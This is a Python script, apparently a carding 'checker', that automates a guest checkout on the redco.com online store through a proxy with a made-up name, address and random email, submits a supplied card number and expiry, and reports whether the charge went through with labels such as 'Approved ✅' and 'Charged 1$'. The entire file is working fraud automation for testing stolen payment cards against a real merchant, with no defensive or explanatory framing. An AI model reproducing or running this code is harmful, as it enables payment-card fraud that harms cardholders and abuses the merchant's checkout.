import requests
import asyncio
import random
import string
from httpx import AsyncClient

async def authnet11(cc, mes, ano, cvv, proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as s:
        ip = await s.get('https://api.ipify.org/')
        print(ip.text)
        
        one = cc[0:1]

        if one == "4":
            cc_type = "VISA"
        elif one == "5":
            cc_type = "MC"
        elif one == "3":
            cc_type = "AMEX"
        elif one == "6":
            cc_type = "DC"

        def random_email() -> str:
            return "".join(random.choice(string.ascii_letters) for x in range(15)) + "@gmail.com"

        email = random_email()

        res = await s.get('https://www.redco.com/')
        xid = res.headers.get('Set-Cookie', '')  
        xidvalue = xid.split('xid_4069d=')[1].split(';')[0].strip() if 'xid_4069d=' in xid else ''

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/Redco-DP-Labels.html',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'target': 'cart',
            'action': 'add',
            'product_id': '454',
            'category_id': '291',
            'price': '',
            'amount': '2',
        }

        retrys = 3
        while retrys > 0:
            try:
                req1 = await s.post('https://www.redco.com/?', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue
        
        retrys = 3
        while retrys > 0:
            try:
                req2 = await s.get('https://www.redco.com/?target=checkout')
                break
            except:
                retrys -= 1
                continue

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/cart.php?mode=checkout',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        retrys = 3
        while retrys > 0:
            try:
                res = await s.get('https://www.redco.com/cart.php?mode=checkout&as_guest=Y&edit_payment', headers=headers)
                break
            except:
                retrys -= 1
                continue

        data = {
            'mode': 'checkout',
            'as_guest': 'Y',
            'cart_operation': 'cart_operation',
            'action': 'update',
            'paymentid': '27',
        }

        retrys = 3
        while retrys > 0:
            try:
                req3 = await s.post('https://www.redco.com/cart.php', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        data = {
            'usertype': 'C',
            'anonymous': 'Y',
            'xid_4069d': xidvalue,
            'submit_addr': '1',
            'address_book[B][firstname]': 'Sebastian',
            'address_book[B][lastname]': 'Gutierrez',
            'address_book[B][address]': '103-105 Central Avenue',
            'address_book[B][address_2]': '',
            'address_book[B][city]': 'Orange',
            'address_book[B][state]': 'NJ',
            'address_book[B][country]': 'US',
            'address_book[B][zipcode]': '07050',
            'address_book[B][zip4]': '',
            'address_book[B][phone]': '5059947000',
            'address_book[B][fax]': '',
            'address_book[S][firstname]': 'Sebastian',
            'address_book[S][lastname]': 'Gutierrez',
            'address_book[S][address]': '103-105 Central Avenue',
            'address_book[S][address_2]': '',
            'address_book[S][city]': 'Orange',
            'address_book[S][state]': 'NJ',
            'address_book[S][country]': 'US',
            'address_book[S][zipcode]': '07050',
            'address_book[S][zip4]': '',
            'address_book[S][phone]': '5059947000',
            'address_book[S][fax]': '',
            'company': 'Hunter',
            'email': email,
            'password_is_modified': 'N',
            'passwd1': '',
            'passwd2': '',
        }

        retrys = 3
        while retrys > 0:
            try:
                req4 = await s.post('https://www.redco.com/cart.php?mode=checkout&edit_address&as_guest=Y&keep_https=yes', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/cart.php?mode=checkout&edit_shipping&as_guest=Y&keep_https=yes',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'mode': 'checkout',
            'as_guest': 'Y',
            'cart_operation': 'cart_operation',
            'action': 'update',
            'paymentid': '27',
            'address_book': '4',
        }

        retrys = 3
        while retrys > 0:
            try:
                req5 = await s.post('https://www.redco.com/cart.php', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'xid_4069d=b823c4c7cc9713a2dad2ab33c4fbb90a; store_language=en; ui-tabs-1=0; __utmc=215864212; __utmz=215864212.1731230969.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RefererCookie=https%3A%2F%2Fwww.redco.com%2F; __utma=215864212.1135948131.1731230969.1731230969.1731234137.2; __utmt=1; __utmb=215864212.11.10.1731234137',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/cart.php?mode=checkout&order_review&as_guest=Y&keep_https=yes',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'paymentid': '27',
            'action': 'place_order',
            'xid_4069d': xid,
            'payment_method': 'Credit Card',
            'Customer_Notes': '',
            'accept_terms': 'Y',
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req6 = await s.post('https://www.redco.com/payment/payment_cc.php',  headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue
        token_ = req6.text.split('name="token" value="')[1].split('"')[0].strip()

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-site',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'target': 'main',
            'action': 'start',
            'token': token_,
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req7 = await s.post('https://checkout.redco.com/payment.php', headers=headers, data=data)
                break
            except:
                retrys -=1
                continue
                
        params = {
            'target': 'main',
            'token': token_,
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req8 = await s.get('https://checkout.redco.com/payment.php', params=params, headers=headers)
                break
            except:
                retrys -=1
                continue
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.redco.com/cart.php?mode=checkout&order_review&as_guest=Y&keep_https=yes',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'paymentid': '27',
            'action': 'place_order',
            'xid_4069d': xidvalue,
            'payment_method': 'Credit Card',
            'Customer_Notes': '',
            'accept_terms': 'Y',
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req9 = await s.post('https://www.redco.com/payment/payment_cc.php', headers=headers, data=data)
                break
            except:
                retrys -=1
                continue
        
        data = {
            'target': 'main',
            'action': 'start',
            'token': token_,
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req10 = await s.post('https://checkout.redco.com/payment.php', headers=headers, data=data)
                break
            except:
                retrys -=1
                continue
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://checkout.redco.com',
            'Pragma': 'no-cache',
            'Referer': f'https://checkout.redco.com/payment.php?target=main&token={token_}',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            "target": "main",
            "form_id": "main",
            "token": token_,
            "action": "pay",
            "posted_data[card_type]": cc_type,
            "posted_data[card_name]": "Sebastian Gutierrez",
            "posted_data[card_number]": cc,
            "posted_data[card_expire_month]": mes,
            "posted_data[card_expire_year]": ano,
            "posted_data[card_cvv2]": '', 
        }        
        retrys = 3
        while retrys > 0:
            try:
                req11 = await s.post('https://checkout.redco.com/payment.php', headers=headers, data=data)
                break
            except:
                retrys -=1
                continue
        
        refid = req11.text.split('name="refId" value="')[1].split('"')[0].strip()
        txn = req11.text.split('name="txnId" value="')[1].split('"')[0].strip()
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://checkout.redco.com',
            'Pragma': 'no-cache',
            'Referer': 'https://checkout.redco.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-site',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'action': 'return',
            'refId': refid,
            'txnId': txn,
            'last_4_cc_num': cc[-4:],
            'card_type': cc_type,
        }
        
        retrys = 3
        while retrys > 0:
            try:
                req12 = await s.post('https://www.redco.com/payment/cc_xpc.php',  headers=headers, data=data)
                break
            except:
                retrys -=1
                continue
            
        if "Your order has been successfully placed" in req12.text:
            status = "Approved ✅"
            mensaje = "Charged 1$"
        else:
            mensaje = req12.text.split('<span class="form-text">Reason:</span>')[1].split('</div>')[0].strip()
            
            if "The transaction has been declined because of an AVS mismatch" in mensaje:
                status = "AVS REJECTED ✅"
            elif "Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"

        return status, mensaje